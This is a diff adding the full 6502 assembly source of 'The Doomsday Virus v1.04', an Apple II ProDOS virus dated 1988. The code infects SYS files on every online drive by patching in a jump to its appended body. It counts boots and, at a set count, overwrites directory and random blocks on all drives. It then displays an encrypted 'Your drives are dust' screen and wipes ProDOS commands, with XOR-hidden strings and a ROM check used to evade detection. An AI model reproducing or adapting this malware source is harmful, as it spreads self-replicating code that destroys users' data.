@@ -1,0 +1,823 @@
+         ORG   $1100
+         LST   off
+****************************
+* The Doomsday Virus v1.04 *
+*  Written in August 1988  *
+*         by -DC-          *
+****************************
+DEVCNT   equ   $BF31
+DEVLST   equ   $BF32
+SAFE     equ   $300
+PARMS    equ   $E00
+PARMS2   equ   $E80
+MLI      equ   $BF00
+RANDOM   equ   $EFAE
+MOVMEM   equ   $FE2C
+*--------------------------------------------------------
+* Notes: Infected files are set up as such:
+* $2000: JMP EOF  Where EOF is start of virus program
+* $2003: Vxx.xx   Version number of virus
+* $2005: xx       # of times virus has spread (misleading value)
+* $2006: xx       Current counter number on disk when this file
+*                 was infected.
+* The value at $2005 is misleading in the sense that the
+* value is only accurate when the virus is ALWAYS ran from the
+* last infected file only, which is hardly ever.
+* The virus will not infect files over the length of $6000.
+*=========================================================
+* Memory: $300-$3XX is a "safe" location
+*         $C00-$DFF is used for data buffer #1
+*         $E00 is used for parm list
+*         $E80 is used for 2nd parm list
+*         $F00-$10FF is used for data buffer #2
+* Hit ^D to by-pass ROM check and function normally
+*=========================================================
+         LDA   #$11
+         STA   $3F1       ;BRK handler
+         STA   $43        ;Hi byte for move location ($1100)
+OVERDAT  LDA   #$00       ;* Gets changed later! *
+         STA   $3C        ;Low byte of start location
+OVERDAT2 LDA   #$48       ;Relocate code from $4800 to $1100
+         STA   $3D
+         LDA   #$FF
+         STA   $3E        ;For $53FF
+OVERDAT3 LDA   #$53       ;End of block to move
+         STA   $3F
+         LDY   #$00       ;Zero out Y register before move
+         STY   $42        ;Low byte of $1100
+         JSR   MOVMEM     ;Relocates data: 1100<4800.53FFM
+         LDA   #<RELO2+$1 ;Lo byte of BRK handler
+         STA   $3F0
+RELO2    hex   00         ;BRK routine
+*------------------------------------------------------
+* This next part reads in block #$0000 and searches for
+* protection byte as well as updating counter.  It then
+* determines whether to go on, skip the scan, or kill.
+*------------------------------------------------------
+START    LDA   #$59
+         STA   $3F0
+         LDA   #$FA
+         STA   $3F1
+         LDA   #$C0
+         STA   $04        ;Confusing ROM DC check routine
+         LDA   #$F8       ;at $F8CF.  Increments from $F8C0.
+         STA   $05
+         LDX   #$06
+START1   LDA   DATA,X     ;Relocates original bytes to
+         STA   DATA1,X    ;a safe place for end of prog.
+         DEX
+         BPL   START1
+         LDA   DEVCNT     ;First routine is used to
+         STA   SAFE       ;load in different drive units
+         LDA   #$03       ;Read in block $00 and update
+         STA   PARMS
+         LDA   $BF30
+         STA   PARMS+1
+         STA   SAFE+12    ;For prefix at end of program
+         LDA   #$00
+         STA   PARMS+4
+         STA   PARMS+5
+         STA   PARMS+2
+         LDA   #$0C
+         STA   PARMS+3
+         JSR   MLI
+         hex   80000E     ;Read block $0000
+         LDA   $C000      ;Check input buffer
+         CMP   #$84       ;^D
+         BNE   NOD
+         BIT   $C010      ;Clear input buffer
+         JMP   RET
+NOD      LDY   #$0F       ;Go from $F8C0 to $F8CF
+         LDA   ($04),Y    ;$DC byte in ROM!
+         ORA   #$69       ;Make it into a #$FD
+         CMP   #$FD
+         BNE   RET        ;Not found
+RET2     JMP   RETURN     ;Byte found, start SYS file
+RET      INC   $0DFE      ;Counter byte
+         LDA   $0DFE
+         AND   #%01111111 ;Turn hi bit off if on
+         CMP   #20        ;20 counts allowed
+         BMI   RET1       ;Not there yet
+         BEQ   KILL       ;It's 20, wipe it all
+ZERO     LDA   #$01       ;Counter was over #$14 for
+         STA   $0DFE      ;some reason.  Clear it.
+         BNE   RET1       ;(always)
+KILL     JMP   BOMB       ;Destroy all online
+RET1     STA   SAFE+11    ;Store counter byte
+         JSR   MLI
+         hex   81000E     ;Writes block back to disk
+         LDA   SAFE+11
+         CMP   #7         ;7 boots before scan
+         BMI   RET2       ;Don't scan online drives yet
+         BEQ   J1         ;Do a forced scan at 7
+         CMP   #13        ;Do a forced scan at 13
+         BEQ   J1
+         CMP   #18        ;Do a forced scan at 18
+         BEQ   J1
+         JSR   RANDOM     ;Get a random number
+         LDA   $A1
+         CMP   #153       ;60/40 chance
+         BPL   RET2       ;Don't scan online (random)
+*-------------------------------
+J1       LDA   #$2B
+         STA   SAFE+2     ;Store next filename location
+         LDA   SAFE       ;and search for a SYS file.
+         BMI   END1       ;If none found on one drive,
+         TAY              ;it checks the next.
+J2       LDA   DEVLST,Y
+         BNE   J3
+NXTDEV   DEC   SAFE
+         JMP   J1
+END1     JMP   RETURN     ;Start SYS file
+*-------------------------------
+* This routine gets the prefix
+* of the current drive unit #
+*-------------------------------
+J3       STA   PARMS+1
+         LDA   #$02
+         STA   PARMS
+         LDA   #$01
+         STA   PARMS+2
+         LDA   #$0C
+         STA   PARMS+3    ;Store returned prefix at $C01
+         JSR   MLI
+         hex   C5000E     ;ONLINE
+         BCS   NXTDEV     ;Error encountered, do new dev
+*-------------------------------
+* Now that we have the prefix,
+* we need to set it.
+*-------------------------------
+         LDA   $C01       ;Length of prefix
+         AND   #$0F       ;Actual length (-1)
+         STA   $C00       ;Relocate it one byte back
+         INC   $C00       ;Actual length
+         LDA   #$AF
+         STA   $C01       ;Need to store a "/" before prefix
+         LDA   #$01
+         STA   PARMS      ;Unit #
+         LDA   #$00
+         STA   PARMS+1
+         LDA   #$0C
+         STA   PARMS+2    ;Buffer at $C00
+         JSR   MLI
+         hex   C6000E     ;SET_PREFIX
+         BCS   NXTDEV     ;Error, try next device
+*-------------------------------
+* We must first check to see
+* that the volume has enough
+* freespace for the virus.
+*-------------------------------
+         LDA   #$0A
+         STA   PARMS
+         JSR   MLI        ;Buffer already set at $C00
+         hex   C4000E     ;GET_FILE_INFO
+         BCS   NXTDEV     ;Error, do next device
+         SEC
+         LDA   PARMS+5
+         SBC   PARMS+8    ;Subtract LSB of blocks
+         TAX
+         LDA   PARMS+6
+         SBC   PARMS+9    ;Subtract MSB of blocks
+         BNE   FIND       ;Plenty of room
+         TXA              ;LSB
+         CMP   #$80       ;Is hi byte on?
+         BPL   FIND       ;Yes, plenty of room
+         CMP   #$07       ;Is there 7 blocks free?
+         BMI   NXTDEV     ;Nope, try next drive
+*-------------------------------
+* Now we read block $02 off the
+* drive in hopes of finding a
+* SYS filetype.
+*-------------------------------
+FIND     LDA   #$03
+         STA   PARMS
+         LDA   $BF30      ;Current unit #
+         STA   PARMS+1
+         LDA   #$00
+         STA   PARMS+2
+         STA   PARMS+5
+         STA   SAFE+5
+         LDA   #$0C
+         STA   PARMS+3
+         LDA   #$02       ;Block $0002
+         STA   PARMS+4
+         STA   SAFE+4
+READ     JSR   MLI
+         hex   80000E     ;READ_BLOCK
+*-------------------------------
+* The next routine searches for
+* files with the filetype of SYS
+*-------------------------------
+         LDA   #$0C
+         STA   $01
+         LDA   #$00
+         STA   $00
+         LDA   #<DATA4-$1 ;Location of PRODOS word
+         STA   $02
+         LDA   #>DATA4
+         STA   $03
+         LDA   PARMS+4    ;Current block #
+         CMP   #$02       ;Is it block $0002?
+         BNE   J6         ;No, this won't work.
+         LDA   #$25
+         CLC
+         ADC   SAFE+2
+         TAY
+         LDA   ($00),Y    ;Location of File Count
+         BNE   J6
+         JMP   NXTDEV     ;No files on this drive
+J6       LDY   SAFE+2
+         LDA   ($00),Y    ;Load a byte from buffer
+         BEQ   J7         ;File is deleted
+         LDA   #$10
+         CLC
+         ADC   SAFE+2
+         TAY
+         LDA   ($00),Y
+         CMP   #$FF       ;Filetype = SYS
+         BNE   J7
+         LDA   #$1D       ;Min_Version (infected marker)
+         CLC
+         ADC   SAFE+2
+         TAY
+         LDA   ($00),Y
+         BEQ   PROCHK     ;Not infected
+         CMP   #$01       ;Is it infected?
+         BEQ   J7         ;Yes, next file please
+*-------------------------------
+* The following makes sure that
+* the filename isn't PRODOS
+*-------------------------------
+PROCHK   LDY   SAFE+2
+         STY   PARMS2     ;Safe spot
+         LDX   #$00
+         STX   PARMS2+1   ;Safe spot
+PDOS     INC   PARMS2+1
+         INC   PARMS2
+         LDY   PARMS2
+         LDA   ($00),Y    ;Following searches for filename
+         EOR   #$88       ;Encrypt letter before match
+         LDY   PARMS2+1
+         CMP   ($02),Y    ;PRODOS letters in virus program
+         BNE   J8
+         LDX   PARMS2+1
+         CPX   #$06
+         BNE   PDOS
+*-------------------------------
+J7       LDA   #$27       ;This routine adds 27 to the
+         CLC              ;registor.  This will move it
+         ADC   SAFE+2     ;to where the next filename
+         TAY              ;should be.
+         STY   SAFE+2
+         BCS   NXTBUF     ;Go from $C00 to $D00
+         CPY   #$7F
+         BMI   J6
+         BEQ   J6
+         CPY   #$D8       ;If it's bordering between $C00
+         BMI   J6         ;and $D00, skip it.
+         LDA   $01
+         CMP   #$0D
+         BNE   J7
+         BEQ   J6         ;(always)
+*-------------------------------
+NXTBUF   LDA   #$0D
+         CMP   $01        ;Has it checked $D00 already?
+         BEQ   NXTBLK     ;Yes, next dir block.
+         STA   $01        ;Now at $D00, not $C00
+         BNE   J6         ;(always)
+*-------------------------------
+NXTBLK   LDA   $0C02      ;Next dir block
+         CLC
+         ADC   $0C03      ;See if there is another block
+         BEQ   NXTBLK1    ;Nope, next drive please
+         LDA   $0C02
+         STA   PARMS+4
+         STA   SAFE+4
+         LDA   $0C03
+         STA   PARMS+5
+         STA   SAFE+5
+         LDA   #$04
+         STA   SAFE+2     ;Store next filename location
+         JMP   READ       ;Read next dir block
+NXTBLK1  JMP   NXTDEV
+*-------------------------------
+J8       LDA   #$1E       ;Where the access byte is
+         CLC
+         ADC   SAFE+2     ;Y registor location
+         TAY
+         LDA   ($00),Y    ;Get the access byte
+         STA   SAFE+8     ;Keep it safe for later
+         CLC
+         ORA   #$03       ;Set the read & write enable bits
+         STA   ($00),Y    ;Store it back to memory
+         JSR   MLI
+         hex   81000E     ;Performs WRITE_BLOCK
+         BCC   J9
+         JMP   NXTDEV     ;Error occured
+J9       LDY   SAFE+2
+         LDA   ($00),Y    ;Gets file type/name_length
+         STA   SAFE+3
+         AND   #$0F       ;Gets length of filename
+         STA   ($00),Y    ;Stores it correctly
+         LDA   #$03
+         STA   PARMS2
+         STY   PARMS2+1
+         LDA   $01
+         STA   PARMS2+2   ;Location of pathname buffer
+         LDA   #$00
+         STA   PARMS2+3
+         STA   $BF94
+         LDA   #$8C
+         STA   PARMS2+4   ;$8C00 - 1024 byte file buffer
+         JSR   MLI
+         hex   C8800E     ;OPENs file
+         LDY   SAFE+2
+         LDA   SAFE+3
+         STA   ($00),Y
+         BCC   J10
+         JMP   J7         ;Error occured, abort this file
+J10      LDA   #$04
+         STA   PARMS2
+         LDA   #$01
+         STA   PARMS2+1
+         LDA   #$00
+         STA   PARMS2+2
+         STA   PARMS2+5
+         LDA   #$0F
+         STA   PARMS2+3   ;Input buffer at $F00
+         LDA   #$07       ;Read first 7 bytes
+         STA   PARMS2+4
+         JSR   MLI
+         hex   CA800E     ;READs file
+         BCS   CLOSE      ;Error occured, abort this file
+         LDA   #$15       ;Location of EOF
+         CLC
+         ADC   SAFE+2     ;Location in memory
+         TAY
+         LDA   ($00),Y    ;Get lo byte of EOF
+         STA   SAFE+6
+         INY
+         LDA   ($00),Y    ;Get hi byte of EOF
+         CLC
+         ADC   #$20       ;Add $2000 to value
+         CMP   #$80       ;Is it over $8000?
+         BPL   CLOSE      ;Yes, abort this file
+         STA   SAFE+7
+         LDA   #$4C
+         CMP   $F00       ;Is it a JMP command?
+         BNE   MODIFY     ;Nope, uninfected!
+         LDA   #1
+         CMP   $F03       ;Is it a v01.04 code?
+         BNE   MODIFY     ;Nope, uninfected!
+         LDA   $F04       ;Should be lo-byte above
+         CMP   #4
+         BNE   MODIFY     ;It isn't
+CLOSE    LDA   #$01
+         STA   PARMS2
+         LDA   #$00
+         STA   PARMS2+1
+         STA   $BF94      ;System Page for open files
+         JSR   MLI
+         hex   CC800E     ;CLOSEs file
+         JMP   J7         ;Go back for next file
+*---------------------------------------------------------
+* We must now change the read only byte to allow for us to
+* write to this file.  Note that $F00 will not be used
+* in order to keep first 7 bytes of original file.  Also,
+* the buffer at $C00 will be used for READ/WRITE, since
+* the dir block has to be loaded in again anyway.
+*---------------------------------------------------------
+MODIFY   LDX   #$06
+MODIFY1  LDA   $F00,X     ;Store first 7 bytes of SYS file
+         STA   DATA,X
+         DEX
+         BPL   MODIFY1
+         LDA   #$4C       ;JMP command
+         STA   $F00       ;Store it in buffer
+         LDY   SAFE+6     ;Lo-byte of EOF
+         STY   $F01
+         LDA   SAFE+7
+         STA   $F02
+         LDA   #1         ;v01.04 code
+         STA   $F03
+         LDA   #4
+         STA   $F04
+         INC   $2005      ;Current # of times virus
+         LDA   $2005      ;has spread.
+         STA   $F05
+         LDA   SAFE+11    ;Counter byte
+         STA   $F06       ;Let's us know what it's set to
+*-------------------------------
+         LDA   #$02
+         STA   PARMS2
+         LDA   #$00
+         STA   PARMS2+2
+         STA   PARMS2+3
+         STA   PARMS2+4
+         JSR   MLI
+         hex   CE800E     ;Sets mark at beginning of file
+         BCS   CLOSE
+         LDA   #$04
+         STA   PARMS2
+         LDA   #$0F
+         STA   PARMS2+3
+         LDA   #$07       ;Write 7 bytes to file
+         STA   PARMS2+4
+         JSR   MLI
+         hex   CB800E     ;WRITE
+         BCC   OVER3
+         JMP   CLOSE
+*-------------------------------
+OVER3    LDA   #$02
+         STA   PARMS2
+         LDA   SAFE+6     ;Lo EOF
+         STA   PARMS2+2
+         LDA   SAFE+7     ;Hi EOF (+ $20)
+         SEC
+         SBC   #$20       ;Subtract $2000 off of it
+         STA   PARMS2+3
+         LDA   #$00
+         STA   PARMS2+4
+         JSR   MLI
+         hex   CE800E     ;Sets mark at EOF
+         BCC   OVER
+         JMP   CLOSE
+OVER     LDA   SAFE+6     ;Low end of EOF
+         STA   OVERDAT+1
+         LDA   SAFE+7     ;Hi end of EOF
+         STA   OVERDAT2+1
+         CLC              ;Add $0AFF to it (also remember the LSB
+         ADC   #$0B       ;of the file - $0AFF + $48xx = $53xx)
+         STA   OVERDAT3+1 ;Store it at beginning of program
+         LDA   #$04
+         STA   PARMS2
+         LDA   #$00       ;Write virus to file
+         STA   PARMS2+2
+         LDA   #$11
+         STA   PARMS2+3
+         LDA   #$FF       ;Length is $0AFF
+         STA   PARMS2+4
+         LDA   #$0A
+         STA   PARMS2+5
+         JSR   MLI
+         hex   CB800E     ;WRITEs virus to file
+         BCC   OVER1
+         JMP   CLOSE
+OVER1    LDA   #$01
+         STA   PARMS2
+         LDA   #$00
+         STA   PARMS2+1
+         STA   $BF94      ;System Page for open files
+         JSR   MLI
+         hex   CC800E     ;CLOSEs file
+*===============================
+         LDA   #$0F       ;Read new dir block into $0F00
+         STA   PARMS+3    ;to get new byte $00 in case of
+         STA   $03        ;seedling/tree/etc change.
+         LDA   #$00
+         STA   $02
+         JSR   MLI
+         hex   80000E     ;READ_BLOCK
+         LDA   $01
+         CMP   #$0D       ;Is it $D00 and not $C00?
+         BNE   NEWBYTE
+         INC   $03        ;Yes, INC from $F00 to $1000
+NEWBYTE  LDY   SAFE+2
+         LDA   ($02),Y    ;Get new byte #$00 from dir
+         STA   ($00),Y    ;Put it in old buffer
+         TYA
+         CLC
+         ADC   #$11
+         TAY
+         LDA   ($02),Y    ;Key pointer
+         STA   ($00),Y
+         INY
+         LDA   ($02),Y
+         STA   ($00),Y
+         LDX   #$01
+         LDA   #$1D       ;Min_Version (infection check)
+         CLC
+         ADC   SAFE+2
+         TAY
+         TXA
+         STA   ($00),Y    ;Put a #$01 in there
+         LDA   #$1E
+         CLC
+         ADC   SAFE+2     ;Access byte location
+         TAY
+         LDA   SAFE+8
+         STA   ($00),Y
+         LDA   SAFE+7
+         SEC
+         SBC   #$20       ;Subtract $2000 from it
+         TAX
+         CLC
+         LDA   SAFE+6
+         ADC   #$FF       ;Add it to $0AFF
+         STA   SAFE+9
+         TXA
+         ADC   #$0A
+         STA   SAFE+10
+         LDA   #$15
+         CLC
+         ADC   SAFE+2
+         TAY
+         LDA   SAFE+9
+         STA   ($00),Y
+         LDA   SAFE+10
+         INY
+         STA   ($00),Y    ;EOF (HI byte)
+         LDA   #$0C       ;Buffer location
+         STA   PARMS+3
+         JSR   MLI
+         hex   81000E     ;WRITE_BLOCK to dir
+         JMP   RETURN
+*-------------------------------
+BOMB     LDY   #$0F       ;Go from $F8C0 to $F8CF
+         LDA   ($04),Y    ;$DC byte in ROM!
+         ORA   #$69       ;Make it into a #$FD
+         CMP   #$FD
+         BEQ   SOUND      ;Byte found, abort!
+BOMB1    LDA   SAFE
+         BMI   SOUND
+         TAY
+         LDA   DEVLST,Y
+         BNE   BOMB3
+NEXT     DEC   SAFE
+         JMP   BOMB1
+*-------------------------------
+BOMB3    STA   PARMS+1
+         LDA   #$00
+         STA   PARMS+5
+         LDA   #$03
+         STA   PARMS
+         LDX   #31        ;Un-encrypt DATA3 text
+ENCRY    LDA   DATA3,X
+         EOR   #$88
+         STA   DATA3,X
+         DEX
+         BPL   ENCRY
+         LDA   #<DATA3    ;Change buffer to DATA3
+         STA   PARMS+2
+         LDA   #>DATA3
+         STA   PARMS+3
+         LDX   #$0F
+BOMB4    STX   PARMS+4    ;Block number
+         JSR   MLI
+         hex   81000E     ;Write block
+         BCS   NEXT
+         DEX
+         BPL   BOMB4      ;Wipe blocks 15-0
+         LDA   #$05       ;Destroy five random blocks
+         STA   SAFE+13
+BOMB5    JSR   RANDOM
+         LDA   $A1        ;Random byte
+         STA   PARMS+4    ;Block number (random)
+         JSR   MLI
+         hex   81000E     ;WRITE_BLOCK
+         BCS   NEXT
+         DEC   SAFE+13
+         BPL   BOMB5      ;Do another one
+         BMI   NEXT       ;(always)...Do next drive
+*-------------------------------
+SOUND    JSR   $FC58
+         LDA   #<SOUND
+         STA   $3F2       ;Make RESET jmp to sound
+         LDA   #>SOUND
+         STA   $3F3
+         EOR   #$A5
+         STA   $3F4
+         LDX   #$00
+PRSCRN   LDA   SCREEN,X
+         EOR   #$88       ;Un-encrypt it
+         STA   $400,X
+         LDA   SCREEN1,X
+         EOR   #$88
+         STA   $500,X
+         LDA   SCREEN2,X
+         EOR   #$88
+         STA   $600,X
+         LDA   SCREEN3,X
+         EOR   #$88
+         STA   $700,X
+         INX
+         BNE   PRSCRN
+         LDA   #$00       ;Sound routine
+         LDX   #$FF
+         LDY   #$DA
+         STA   $904C
+         STX   $1C9B
+         STY   $1C9C
+SOUND2   LDA   $904C
+         LDX   $1C9C
+         JSR   SOUND3
+         INC   $904C
+         LDA   $904C
+         CMP   #$1C9B
+         BCC   SOUND2
+         BCS   QUIT       ;(always)...End of sound
+SOUND3   STA   $7083
+         STX   $7084
+         LDA   #$00
+SOUND4   LDX   $7085
+         LDY   $FA00,X
+SOUND5   DEY
+         BNE   SOUND5
+         LDA   $C030
+         LDA   $C020
+         LDY   $7083
+         BEQ   SOUND6
+SOUND7   DEY
+         BNE   SOUND7
+SOUND6   LDA   $C030
+         LDA   $C020
+         DEC   $7085
+         DEC   $7084
+         BNE   SOUND4
+         RTS
+QUIT     JSR   $FB60      ;Prints Apple //e
+         LDX   #$00
+QUIT1    LDA   DATA2,X
+         EOR   #$88       ;Un-encrypt the data
+         BEQ   QUIT3
+         JSR   $FDED
+         INX
+         BNE   QUIT1      ;(always)
+QUIT3    LDX   #$6D       ;Wipes out ProDOS commands
+QUIT4    STA   $B8D1,X
+         DEX
+         BNE   QUIT4
+         JMP   $FF69      ;Monitor entry point
+*-------------------------------
+RETURN   LDA   #$02       ;Get original prefix
+         STA   PARMS
+         LDA   SAFE+12    ;Original $BF30
+         STA   PARMS+1
+         LDA   #$00
+         STA   PARMS+2
+         STA   PARMS2+1   ;Set up next MLI data too
+         LDA   #$0C
+         STA   PARMS+3    ;Buffer at $0C00
+         STA   PARMS2+2
+         JSR   MLI
+         hex   C5000E     ;ONLINE
+         LDA   #$01
+         STA   PARMS2     ;Now we set the prefix
+         JSR   MLI
+         hex   C6800E     ;SET_PREFIX
+         LDY   #$06
+RETURN1  LDA   DATA1,Y    ;Where original bytes are at
+         STA   $2000,Y
+         DEY
+         BPL   RETURN1
+         LDX   #$00
+         TXA
+WIPE     STA   $1100,X
+         STA   $1200,X
+         STA   $1300,X
+         INX
+         BNE   WIPE       ;Wipes out memory
+         JMP   $2000      ;Start SYS file
+*-------------------------------
+DATA     hex   4C4720EEEE4107 ;Replaced by orignal bytes
+DATA1    hex   00000000000000
+DATA2    hex   8D8D
+         asc   "[End run of the Doomsday virus]",8D8D
+         asc   "(c) 1988 by L&L Productions",8D
+         asc   "Making copies of this virus for other",8D
+         asc   "than your personal use is against state",8D
+         asc   "and local copyright laws!",8D8D
+         asc   "- Welcome to the Jungle -",8D00
+DATA4    asc   'PRODOS'
+********************************
+SCREEN   hex   D7A0A0A0CAF5F3F4
+         hex   A0F7E8E5EEA0F9EF
+         hex   F5A0F4E8EFF5E7E8
+         hex   F4A0E9F4A0F7E1F3
+         hex   A0F3E1E6E5A0A0D4
+         hex   C2A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A020A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A020A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   D3A0A0A0A0A0A0A0
+         hex   A0A0A01C1F1F1F1F
+         hex   1F1F1F1F1F1F1F1F
+         hex   1F1F1F1F1F1F2FA0
+         hex   A0A0A0A0A0A0A0C4
+         hex   A000B20000A0127A
+         hex   D2A0A0A0F4EFA0F4
+         hex   F5F2EEA0EFEEA0F9
+         hex   EFF5F2A0E3EFEDF0
+         hex   F5F4E5F2AEAEAEAE
+         hex   A0A0A0A0A0A0A0C8
+         hex   D9A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A020A0
+         hex   2D2D2D2DA0A02D2D
+         hex   2D2DA020A0A0A0A0
+         hex   A0A0A0A0A0A0A0CC
+         hex   C3A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0D5
+         hex   040000FF00003C07
+SCREEN1  hex   C9A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0C1
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A02020
+         hex   2020202020202020
+         hex   20202020A0A0A0A0
+         hex   A0A0A0A0A0A0A0A6
+         hex   C8A0A0A0A0A0A0A0
+         hex   C9E6A0F9EFF5A0E8
+         hex   E1F6E5A0E1EEF9A0
+         hex   E3EFEDF0ECE1E9EE
+         hex   F4F3ACA0A0A0A0C3
+         hex   25000000000000DF
+         hex   D4A0A0A0A0A0A01C
+         hex   2020202020202020
+         hex   2020202020202020
+         hex   2020202020202020
+         hex   20202FA0A0A0A0CE
+         hex   C7A0A0A0A0A0A0A0
+         hex   A0A0A0A0A02FA0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A01CA0A0A0
+         hex   A0A0A0A0A0A0A0CC
+         hex   C1A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0F0
+         hex   ECE5E1F3E5A0E3E1
+         hex   ECECBAA0A0A0A0A0
+         hex   A0A0A0A0A0A0A0D4
+         hex   6009001709230000
+SCREEN2  hex   D4A0A0A0A0A0A020
+         hex   A0C7D5C5D3D3A0D7
+         hex   C8C1D4A1A0A0D9CF
+         hex   D5A7D6C5A0CAD5D3
+         hex   D4A020A0A0A0A0D8
+         hex   D2A0A0A0A0A0A0A0
+         hex   A0A0A0A02FA0D8A0
+         hex   D8A0D8A0D8A0D8A0
+         hex   D8A0D8A0A01CA0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   C5A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0C9
+         hex   6000009800800050
+         hex   C5A0A0A0A0A0A020
+         hex   A0A0C2C5C3CFCDC5
+         hex   A0D4C8C5A0D6C9C3
+         hex   D4C9CDA0CFC6A0C1
+         hex   A0A020A0A0A0A0A0
+         hex   C5A0A0A0A0A0A0A0
+         hex   A0A0A02FA0D8A0D8
+         hex   A0D8A0D8A0D8A0D8
+         hex   A0D8A0D8A0A01CA0
+         hex   A0A0A0A0A0A0A0D0
+         hex   C6A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0B1AD
+         hex   B8B0B0ADC5C1D4AD
+         hex   D3C8C9D4A0A0A0A0
+         hex   A0A0A0A0A0A0A0CF
+         hex   1050000050000050
+SCREEN3  hex   CEA0A0A0A0A0A020
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0564952555361
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A020A0A0A0A0D4
+         hex   C7A0A0A0A0A0A0A0
+         hex   A0A02FA0D8A0D8A0
+         hex   D820202020202020
+         hex   20A0D8A0D8A0A01C
+         hex   A0A0A0A0A0A0A0D2
+         hex   C5A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0A0A0A0A0A0CE
+         hex   500000D001000044
+         hex   A0A0A0A0A0A0A02F
+         hex   2020202020202020
+         hex   2020202020202020
+         hex   2020202020202020
+         hex   20201CA0A0A0A0CF
+         hex   A0A0A0A0A0A0A0A0
+         hex   A0A0202D2D2D2D2D
+         hex   2D2D2D2D2D2D2D2D
+         hex   2D2D2D2D2D2D2D20
+         hex   A0A0A0A0A0A0A0CF
+         hex   D2A0A0A0A0A0A0A0
+         hex   A0A7D3E8E1FAFAE2
+         hex   EFF4ACA0CEE1EEEF
+         hex   EFA0CEE1EEEFEFA7
+         hex   A0A0A0A0A0A0A0D3
+         hex   C714490705532044
+DATA3    asc   "Give up!  Your drives are dust!"
+********************************
+* SAV /FILES/NEWVIRUS
